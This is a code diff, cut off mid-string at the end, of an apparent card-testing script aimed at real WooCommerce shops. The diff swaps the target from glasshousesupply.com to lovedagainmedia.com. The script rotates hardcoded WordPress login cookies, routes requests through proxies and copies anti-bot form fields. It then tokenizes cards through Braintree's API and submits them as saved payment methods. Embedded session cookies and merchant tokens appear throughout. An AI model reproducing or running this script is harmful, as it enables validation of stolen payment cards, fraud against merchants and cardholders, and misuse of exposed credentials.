@@ -23,17 +23,10 @@ def notauto(ccx):
     first_line = file.readline()
     last_used_times = {}
   while True:
-    lines = '''aman44%40gmail.com%7C1744896112%7CSlBqEAxO6exEeroL3K05xOuEOOhoiC6hDDYXkRDtms9%7Cf98472d66230417354f2481b3e5571249ed6e66edabcfce6aadfab0b824637b5
-amay2u2i29992n44%40gmail.com%7C1744896630%7C5pDUB2jidT153JmrBDCzh5Eag0rUBJMtXfCsWVtlQBT%7C5fe8d807f092388898f545ce62f385202640f40be03d1b97882b802a91317a48
-ambdjdkwkkean44%40gmail.com%7C1744900543%7CTIaFuphDuekIpOJSG6rhG84oCBCaZwKtalNYSt77Hiq%7C137b18564710f0eea1533acf4672aef54652403daa1998bac8c6dbbcf45d656b
-ajejejyejwj2jman44%40gmail.com%7C1744900692%7Cf2t5MJjOiedj2k4PndwjIZ08OGYF0CxEeoCjD3usBBV%7C660103b8d9c387434c8e4a79893ff3947d2d086fbab44ab23e26560c59715bb4
-a929292hman44%40gmail.com%7C1744950871%7CRZv14Vh6WYezkvDtV4hi9HFB6cICI9I3xAS8tDJOauB%7Cb76fe969f33b37e177b0b35e0de89c67ddac36ffb4f87771db8418a51fb5b946
-aman4ysyeu2844%40gmail.com%7C1744951014%7CXwqvW1OLGw1qtBJ06kWorxO3ShN7BLubLF4G9LPFBSC%7Cbdb676c5f62e1272b736561e38910b34a21d82ce20da6c4ee50916738d114a71
-aman4euiei34%40gmail.com%7C1744951143%7CU4PVbdD5Llaz9ML3pHdWmGfffXxBWjCxWrbA7lcJ2rI%7C867c61ce909f8ebfdd45c73c2aa76d6f6b31acf2d4524da80f1f3d56b264efae
-ayeu372727man44%40gmail.com%7C1744951290%7CNX6DeTzDD9f10coS9GefFu5eIZKQmkcKwBF0Di4m7rX%7C7364894de11652c6ceff526caf020db2b14aaf79e54235292449f840ab6ce7ae
-amty722an44%40gmail.com%7C1744951397%7C0Bftm7d3idI6dK8Tel4g8pdSFxuJ2p2dFpOFJYtO4JK%7C43f9a789e7611ecfab79f5f36aa61ecb6a2a34c03a2a26b5a1e321fcf071222e
-amany2y272u44%40gmail.com%7C1744951507%7CZP6sZ7Fqcd7f05QMBpQfy8SXFln70vAyDwKHotI64ys%7Ccf1ec290f4c8f2846b5f16b8b305c3584a35e4585a845d3ba387fca8fac0ff77
-ama55tt2ghjuiwn44%40gmail.com%7C1744951750%7C8bdaZ82y3OTvjJmRhQpnrC7YfUq5PP0pXF2ucXptHcM%7C09b094887f700df3a4579e447a1b232ee93888d7bdd1f92a8e483893965d52af'''
+    lines = '''khushi80%7C1745040836%7Chitwg4oNGarZLryZ8Erho2E6qecl1kLkUdJ5S4ByvG5%7Cc6c9441b532265341cee0dfe213605d8a94211676aaeaef83313c3af524950e3
+jhonsmith56%7C1745043318%7CRjafOSRqkA7hndNCSuNt6Pmia4SDCVkvCGjwf9f9no9%7C9fac668e78566abcaca5ddad27338aa6cc5d9047ec880f4deddc4965a3299dfd
+rahul900%7C1745067383%7CqqUyg5PpWmakfhY4ifxaAnyBGtkyqS6vU6UOZzxH0Lk%7C27ac02d7ae39b2258da3826b03ab3a0adbbde7f34304ef76d56fe6f67c3939d1
+rahul999%7C1745067630%7Cn0E8dDIQRcD23SbMVlLmT8aZh1tlFO1cODUi9jPwFQK%7Ce69b97f60aeca2b675f958a0c8ec0ef1cddc2b1122f4bec93e36c14e34f6bf6f'''
     lines = lines.strip().split('\n')
     random_line_number = random.randint(0, len(lines) - 1)
     big = lines[random_line_number]
@@ -50,24 +43,34 @@ ama55tt2ghjuiwn44%40gmail.com%7C1744951750%7C8bdaZ82y3OTvjJmRhQpnrC7YfUq5PP0pXF2
     file.write(big)
     print(big)
   cookies = {
-    'wordpress_logged_in_b444e0f1bbb883efdac80935bdd84199': big,
-    'wfwaf-authcookie-98378724241a3d95191bebf32899230c': '100705%7Cother%7Cread%7C754ebfb787cbaeaea34079c370e1f2ead5643e9f5386e3d0c50484feb4e5bbb0',
     'sbjs_migrations': '1418474375998%3D1',
-    'sbjs_current_add': 'fd%3D2025-03-16%2011%3A44%3A19%7C%7C%7Cep%3Dhttps%3A%2F%2Fglasshousesupply.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fglasshousesupply.com%2Fmy-account%2Fadd-payment-method%2F',
-    'sbjs_first_add': 'fd%3D2025-03-16%2011%3A44%3A19%7C%7C%7Cep%3Dhttps%3A%2F%2Fglasshousesupply.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fglasshousesupply.com%2Fmy-account%2Fadd-payment-method%2F',
+    'sbjs_current_add': 'fd%3D2025-04-05%2005%3A03%3A00%7C%7C%7Cep%3Dhttps%3A%2F%2Flovedagainmedia.com%2Fmy-account%2Fadd-payment-method%7C%7C%7Crf%3D%28none%29',
+    'sbjs_first_add': 'fd%3D2025-04-05%2005%3A03%3A00%7C%7C%7Cep%3Dhttps%3A%2F%2Flovedagainmedia.com%2Fmy-account%2Fadd-payment-method%7C%7C%7Crf%3D%28none%29',
     'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
     'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
-    'cf_clearance': 'CCAg4uwlxO.Qqur8ew8BJHbSG0uI.h0Hq6JUJ.Mjq8U-1742127267-1.2.1.1-uZDEiW70g.oAsyttj6XTD1yyTI.wajTRLCw6lwCdChwHR9ihc7PLsH6I5J2kch.HnTgSnML4CCm0acGePaglKKML2.mshBGbKTlQOA.BJKZLxNAWusXSlb09MIRLaWgteeFkQXNDNUB_AU9RKM44lqL9pD7Ckrl6vcCwnJXt7ELL2SGOeixJzUE.o2xypZbNLtcprpJSPk1B3ANJkjpCvAqSxNXyMHHwO51_ciXU_SDB1mOjLER5SHfOz2L36YnUpnIZ7p8v6ZCfhPlS2Qcpv.Xe1Blj8.ZGKneFU8OR05n9hOMk1Q25X2WaXdX96rxjfXIon18xWXyK82CeqTK1lE5qcS05wd1pS86t0qlu3fQ',
-    'sbjs_session': 'pgs%3D19%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fglasshousesupply.com%2Fmy-account%2Fpayment-methods%2F',
+    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Mobile%20Safari%2F537.36',
+    '_gcl_au': '1.1.1819597955.1743831181',
+    '_tt_enable_cookie': '1',
+    '_ttp': '01JR270ADYY7C4NGXWF07MJZJD_.tt.1',
+    'groundhogg-lead-source': 'https://lovedagainmedia.com/my-account/add-payment-method',
+    'groundhogg-tracking': 'Zk83QVlFUE42S1ZlY1hKc0RFMGZDWHJUOUNYUnZHRFJBenc2OU9ieUpCcz0%3D',
+    'breeze_folder_name': '3200521161cb8df9c497c844012f06c82ff68484',
+    'wordpress_logged_in_ef622a6d6df3290e271fd50a256d6fba': big,
+    'mcfw-wp-user-cookie': 'NjY5ODUxfDB8NjN8NjcyX2E5MGJlM2NhOTI2Y2RjOGFlNmI4MGQ5OWFkY2Y4YzJiMGI0MDY1MTYwY2UzMWVkM2RiMWQ1NDJlYzA1ZTdhOGU%3D',
+    'wfwaf-authcookie-a40366314e68c30ea30dae8bbdc22a9d': '669851%7Cother%7Cread%7C0b9f27d3c717fba3db9c0fecf1cce472fee36be9ed94ad709c00aebe132044a4',
+    'tk_ai': 'OWLUABG2DFAjtgCM8Fku0wFM',
+    'wordpress_test_cookie': 'WP%20Cookie%20check',
+    'sbjs_session': 'pgs%3D25%7C%7C%7Ccpg%3Dhttps%3A%2F%2Flovedagainmedia.com%2Fmy-account%2Fpayment-methods',
+    'tk_qs': '',
+    'groundhogg-page-visits': '[["/my-account/payment-methods",[[1743831242,1],[1743831248,1],[1743831335,1],[1743831476,1],[1743831764,1]]],["/my-account/add-payment-method",[[1743831678,1],[1743831691,1],[1743831735,1],[1743831746,1],[1743831757,1]]],["/my-account/edit-address",[[1743831299,1],[1743831328,1]]],["/my-account/edit-address/billing",[[1743831306,1]]]]',
 }
 
   headers = {
-    'authority': 'glasshousesupply.com',
+    'authority': 'lovedagainmedia.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9',
-    'referer': 'https://glasshousesupply.com/my-account/payment-methods/',
-    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+    'referer': 'https://lovedagainmedia.com/my-account/payment-methods',
+    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
     'sec-fetch-dest': 'document',
@@ -75,10 +78,10 @@ ama55tt2ghjuiwn44%40gmail.com%7C1744951750%7C8bdaZ82y3OTvjJmRhQpnrC7YfUq5PP0pXF2
     'sec-fetch-site': 'same-origin',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': user,
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 }
 
-  response = requests.get('https://glasshousesupply.com/my-account/add-payment-method/', cookies=cookies, headers=headers, proxies=proxy)
+  response = requests.get('https://lovedagainmedia.com/my-account/add-payment-method', cookies=cookies, headers=headers, proxies=proxy)
   add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
   enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text).group(1)
   dec = base64.b64decode(enc).decode('utf-8')
@@ -86,6 +89,7 @@ ama55tt2ghjuiwn44%40gmail.com%7C1744951750%7C8bdaZ82y3OTvjJmRhQpnrC7YfUq5PP0pXF2
   print(au)
   response = requests.get("https://ipinfo.io/json", proxies=proxy)
   print(response.text)
+  
 
   headers = {
     'authority': 'payments.braintree-api.com',
@@ -96,20 +100,20 @@ ama55tt2ghjuiwn44%40gmail.com%7C1744951750%7C8bdaZ82y3OTvjJmRhQpnrC7YfUq5PP0pXF2
     'content-type': 'application/json',
     'origin': 'https://assets.braintreegateway.com',
     'referer': 'https://assets.braintreegateway.com/',
-    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
     'sec-fetch-dest': 'empty',
     'sec-fetch-mode': 'cors',
     'sec-fetch-site': 'cross-site',
-    'user-agent': user,
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 }
 
   json_data = {
     'clientSdkMetadata': {
         'source': 'client',
         'integration': 'custom',
-        'sessionId': '6c244cd1-8fc1-4764-872a-779df4d8a7ac',
+        'sessionId': 'ee98a83b-782c-4e39-9a7f-ca144ea38d36',
     },
     'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
     'variables': {
@@ -137,27 +141,36 @@ ama55tt2ghjuiwn44%40gmail.com%7C1744951750%7C8bdaZ82y3OTvjJmRhQpnrC7YfUq5PP0pXF2
   print(tok)
 
   cookies = {
-    'wordpress_logged_in_b444e0f1bbb883efdac80935bdd84199': big,
-    'wfwaf-authcookie-98378724241a3d95191bebf32899230c': '100705%7Cother%7Cread%7C754ebfb787cbaeaea34079c370e1f2ead5643e9f5386e3d0c50484feb4e5bbb0',
+    '_gcl_au': '1.1.1819597955.1743831181',
+    '_tt_enable_cookie': '1',
+    '_ttp': '01JR270ADYY7C4NGXWF07MJZJD_.tt.1',
+    'groundhogg-lead-source': 'https://lovedagainmedia.com/my-account/add-payment-method',
+    'groundhogg-tracking': 'Zk83QVlFUE42S1ZlY1hKc0RFMGZDWHJUOUNYUnZHRFJBenc2OU9ieUpCcz0%3D',
+    'breeze_folder_name': '3200521161cb8df9c497c844012f06c82ff68484',
+    'wordpress_logged_in_ef622a6d6df3290e271fd50a256d6fba': big,
+    'mcfw-wp-user-cookie': 'NjY5ODUxfDB8NjN8NjcyX2E5MGJlM2NhOTI2Y2RjOGFlNmI4MGQ5OWFkY2Y4YzJiMGI0MDY1MTYwY2UzMWVkM2RiMWQ1NDJlYzA1ZTdhOGU%3D',
+    'tk_ai': 'OWLUABG2DFAjtgCM8Fku0wFM',
+    'wfwaf-authcookie-a40366314e68c30ea30dae8bbdc22a9d': '669851%7Cother%7Cread%7Ce7f058eac4f1febfc32d855a3ba1bd66c0ec823be4a8ab53de38862d0464ce34',
     'sbjs_migrations': '1418474375998%3D1',
-    'sbjs_current_add': 'fd%3D2025-03-16%2011%3A44%3A19%7C%7C%7Cep%3Dhttps%3A%2F%2Fglasshousesupply.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fglasshousesupply.com%2Fmy-account%2Fadd-payment-method%2F',
-    'sbjs_first_add': 'fd%3D2025-03-16%2011%3A44%3A19%7C%7C%7Cep%3Dhttps%3A%2F%2Fglasshousesupply.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fglasshousesupply.com%2Fmy-account%2Fadd-payment-method%2F',
+    'sbjs_current_add': 'fd%3D2025-04-05%2011%3A46%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Flovedagainmedia.com%2Fmy-account%2Fadd-payment-method%7C%7C%7Crf%3Dhttps%3A%2F%2Flovedagainmedia.com%2Fmy-account%2Fadd-payment-method',
+    'sbjs_first_add': 'fd%3D2025-04-05%2011%3A46%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Flovedagainmedia.com%2Fmy-account%2Fadd-payment-method%7C%7C%7Crf%3Dhttps%3A%2F%2Flovedagainmedia.com%2Fmy-account%2Fadd-payment-method',
     'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
     'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
-    'cf_clearance': 'CCAg4uwlxO.Qqur8ew8BJHbSG0uI.h0Hq6JUJ.Mjq8U-1742127267-1.2.1.1-uZDEiW70g.oAsyttj6XTD1yyTI.wajTRLCw6lwCdChwHR9ihc7PLsH6I5J2kch.HnTgSnML4CCm0acGePaglKKML2.mshBGbKTlQOA.BJKZLxNAWusXSlb09MIRLaWgteeFkQXNDNUB_AU9RKM44lqL9pD7Ckrl6vcCwnJXt7ELL2SGOeixJzUE.o2xypZbNLtcprpJSPk1B3ANJkjpCvAqSxNXyMHHwO51_ciXU_SDB1mOjLER5SHfOz2L36YnUpnIZ7p8v6ZCfhPlS2Qcpv.Xe1Blj8.ZGKneFU8OR05n9hOMk1Q25X2WaXdX96rxjfXIon18xWXyK82CeqTK1lE5qcS05wd1pS86t0qlu3fQ',
-    'sbjs_session': 'pgs%3D20%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fglasshousesupply.com%2Fmy-account%2Fadd-payment-method%2F',
+    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Mobile%20Safari%2F537.36',
+    'sbjs_session': 'pgs%3D26%7C%7C%7Ccpg%3Dhttps%3A%2F%2Flovedagainmedia.com%2Fmy-account%2Fadd-payment-method',
+    'tk_qs': '',
+    'groundhogg-page-visits': '[["/my-account/add-payment-method",[[1743855178,1],[1743855365,1],[1743855398,1],[1743855615,1],[1743855643,1]]],["/my-account/payment-methods",[[1743853923,1]]]]',
 }
 
   headers = {
-    'authority': 'glasshousesupply.com',
+    'authority': 'lovedagainmedia.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9',
     'cache-control': 'max-age=0',
     'content-type': 'application/x-www-form-urlencoded',    
-    'origin': 'https://glasshousesupply.com',
-    'referer': 'https://glasshousesupply.com/my-account/add-payment-method/',
-    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+    'origin': 'https://lovedagainmedia.com',
+    'referer': 'https://lovedagainmedia.com/my-account/add-payment-method',
+    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
     'sec-fetch-dest': 'document',
@@ -165,27 +178,25 @@ ama55tt2ghjuiwn44%40gmail.com%7C1744951750%7C8bdaZ82y3OTvjJmRhQpnrC7YfUq5PP0pXF2
     'sec-fetch-site': 'same-origin',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': user,
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 }
 
   data = {
     'payment_method': 'braintree_cc',
     'braintree_cc_nonce_key': tok,
-    'braintree_cc_device_data': '{"device_session_id":"d93c0f351e441c91b6b49ab9d2f2a871","fraud_merchant_id":null,"correlation_id":"1cd6de08-ac9f-4dac-9738-f846dca6"}',
+    'braintree_cc_device_data': '{"device_session_id":"cadb4f495bb4209541dee0591e8f5286","fraud_merchant_id":null,"correlation_id":"9a4b955a-bf6d-42c4-91bd-a3baf6e8"}',
     'braintree_cc_3ds_nonce_key': '',
-    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/gsnpd3rfchdqjpkp/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/gsnpd3rfchdqjpkp"},"merchantId":"gsnpd3rfchdqjpkp","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"kount":{"kountMerchantId":null},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["Visa","MasterCard","Discover","JCB","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"Glass House Supply","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NDIyMTM5NzIsImp0aSI6IjljMzNiNDAwLTc2MmMtNDczMC1hZGMzLTdhM2IzZmIzNDNjZCIsInN1YiI6ImdzbnBkM3JmY2hkcWpwa3AiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImdzbnBkM3JmY2hkcWpwa3AiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5IiwibWFuYWdlX3ZhdWx0Il0sInNjb3BlIjpbIkJyYWludHJlZTpWYXVsdCJdLCJvcHRpb25zIjp7fX0.IEjz_pe5iVfQyQxVm5maCb5-cxxVKE3FupqBPCHsz88-x9g2753sUNniEE4S0wPBIzca-qAOgCaJ48SjvOjN5g","paypalClientId":"AUbS02x4orTIJOuTTxAgXN87eUn7l8n0LtbH5UvfAmU44swb4BUJ_Qk65pGcHV6vfV23jGEJ9aL5Q-ln","supportedNetworks":["visa","mastercard","amex","discover"]},"payWithVenmo":{"merchantId":"4016730080957399375","accessToken":"access_token$production$gsnpd3rfchdqjpkp$28454b24bcf28cb102a779aa4289345a","environment":"production","enrichedCustomerDataEnabled":false},"paypalEnabled":true,"paypal":{"displayName":"Glass House Supply","clientId":"AUbS02x4orTIJOuTTxAgXN87eUn7l8n0LtbH5UvfAmU44swb4BUJ_Qk65pGcHV6vfV23jGEJ9aL5Q-ln","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"glasshousesupply_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
+    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/rjxzjtn49jmc2mm3/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/rjxzjtn49jmc2mm3"},"merchantId":"rjxzjtn49jmc2mm3","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"rjxzjtn49jmc2mm3","supportedNetworks":["visa","mastercard","amex","discover"]},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["Visa","MasterCard","Discover","JCB","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"Loved Again Media","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NDM5NDE3NjYsImp0aSI6ImE0NDI5YmM2LWUyODEtNDM2Yi05ZDk5LTg2ODVmNDRmOTFkYiIsInN1YiI6InJqeHpqdG40OWptYzJtbTMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InJqeHpqdG40OWptYzJtbTMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5IiwibWFuYWdlX3ZhdWx0Il0sInNjb3BlIjpbIkJyYWludHJlZTpWYXVsdCJdLCJvcHRpb25zIjp7fX0.OBvNRuBD_Cdml0RZNSWhIrYD-o-q1NUcV2p-3-lp98yYr7yDzyNFGu8XoQwaBRm5PRmnFvItn1236GDTdnG08g","paypalClientId":"AdwNjZe-KdxfMpASssaiCHu_6md6KiXqwiBOmPCfx2Jbocb_HBB8aPEN1kWkrvJN_6vvbjpYaCL89gU1","supportedNetworks":["visa","mastercard","amex","discover"]},"payWithVenmo":{"merchantId":"3336777698625192868","accessToken":"access_token$production$rjxzjtn49jmc2mm3$501425b5cb865ff22144901bb5a31794","environment":"production","enrichedCustomerDataEnabled":false},"paypalEnabled":true,"paypal":{"displayName":"Loved Again Media","clientId":"AdwNjZe-KdxfMpASssaiCHu_6md6KiXqwiBOmPCfx2Jbocb_HBB8aPEN1kWkrvJN_6vvbjpYaCL89gU1","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"lovedagainmedia_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
     'woocommerce-add-payment-method-nonce': add_nonce,
-    '_wp_http_referer': '/my-account/add-payment-method/',
+    '_wp_http_referer': '/my-account/add-payment-method',
     'woocommerce_add_payment_method': '1',
+    'apbct_email_id__elementor_form': '',
+    'ct_bot_detector_event_token': 'e3d4f46686dd39e8bb21f37634b4eba13178687a60669e79ff51419251b31e29',
+    'apbct_visible_fields': 'eyIwIjp7InZpc2libGVfZmllbGRzIjoiIiwidmlzaWJsZV9maWVsZHNfY291bnQiOjAsImludmlzaWJsZV9maWVsZHMiOiJicmFpbnRyZWVfY2Nfbm9uY2Vfa2V5IGJyYWludHJlZV9jY19kZXZpY2VfZGF0YSBicmFpbnRyZWVfY2NfM2RzX25vbmNlX2tleSBicmFpbnRyZWVfY2NfY29uZmlnX2RhdGEgd29vY29tbWVyY2UtYWRkLXBheW1lbnQtbWV0aG9kLW5vbmNlIF93cF9odHRwX3JlZmVyZXIgd29vY29tbWVyY2VfYWRkX3BheW1lbnRfbWV0aG9kIGFwYmN0X2VtYWlsX2lkX19lbGVtZW50b3JfZm9ybSBjdF9ib3RfZGV0ZWN0b3JfZXZlbnRfdG9rZW4gY3Rfbm9fY29va2llX2hpZGRlbl9maWVsZCIsImludmlzaWJsZV9maWVsZHNfY291bnQiOjEwfX0=',
+    'ct_no_cookie_hidden_field': '_ct_no_cookie_data_eyJjdF9tb3VzZV9tb3ZlZCI6dHJ1ZSwiY3RfaGFzX3Njcm9sbGVkIjp0cnVlLCJjdF9jb29raWVzX3R5cGUiOiJub25lIiwiYXBiY3RfaGVhZGxlc3MiOmZhbHNlLCJhcGJjdF92aXNpYmxlX2ZpZWxkcyI6IntcInZpc2libGVfZmllbGRzXCI6XCJcIixcInZpc2libGVfZmllbGRzX2NvdW50XCI6MCxcImludmlzaWJsZV9maWVsZHNcIjpcImJyYWludHJlZV9jY19ub25jZV9rZXkgYnJhaW50cmVlX2NjX2RldmljZV9kYXRhIGJyYWludHJlZV9jY18zZHNfbm9uY2Vfa2V5IGJyYWludHJlZV9jY19jb25maWdfZGF0YSB3b29jb21tZXJjZS1hZGQtcGF5bWVudC1tZXRob2Qtbm9uY2UgX3dwX2h0dHBfcmVmZXJlciB3b29jb21tZXJjZV9hZGRfcGF5bWVudF9tZXRob2QgYXBiY3RfZW1haWxfaWRfX2VsZW1lbnRvcl9mb3JtIGN0X2JvdF9kZXRlY3Rvcl9ldmVudF90b2tlbiBhcGJjdF92aXNpYmxlX2ZpZWxkcyBjdF9ub19jb29raWVfaGlkZGVuX2ZpZWxkXCIsXCJpbnZpc2libGVfZmllbGRzX2NvdW50XCI6MTF9IiwiY3RfZmtwX3RpbWVzdGFtcCI6MTc0Mzg1NTY2MiwiY3Rfc2NyZWVuX2luZm8iOiJ7XCJmdWxsV2lkdGhcIjozNjAsXCJmdWxsSGVpZ2h0XCI6MzA1NyxcInZpc2libGVXaWR0aFwiOjM2MCxcInZpc2libGVIZWlnaHRcIjo2NTR9IiwiY3RfY2hlY2tqcyI6IjlkZGE1Y2U2ZGIxMDBjZDg2NTQ5MDg0NWFjM2QzMmQxYWM3MGJhNjA2ZDJkMmFkNjk1OGJiODE0OTg3MzBiOTEiLCJjdF90aW1lem9uZSI6NS41LCJjdF9jaGVja2VkX2VtYWlscyI6IjAiLCJjdF9oYXNfa2V5X3VwIjoidHJ1ZSIsImN0X3BzX3RpbWVzdGFtcCI6MTc0Mzg1NTY0MSwiYXBiY3RfcGFnZV9oaXRzIjo0LCJjdF9oYXNfaW5wdXRfZm9jdXNlZCI6InRydWUiLCJjdF9wb2ludGVyX2RhdGEiOiJbXSIsImN0X2NoZWNrZWRfZW1haWxzX2V4aXN0IjoiMCIsImFwYmN0X3Nlc3Npb25faWQiOiJqbHAiLCJhcGJjdF9zZXNzaW9uX2N1cnJlbnRfcGFnZSI6Imh0dHBzOi8vbG92ZWRhZ2Fpbm1lZGlhL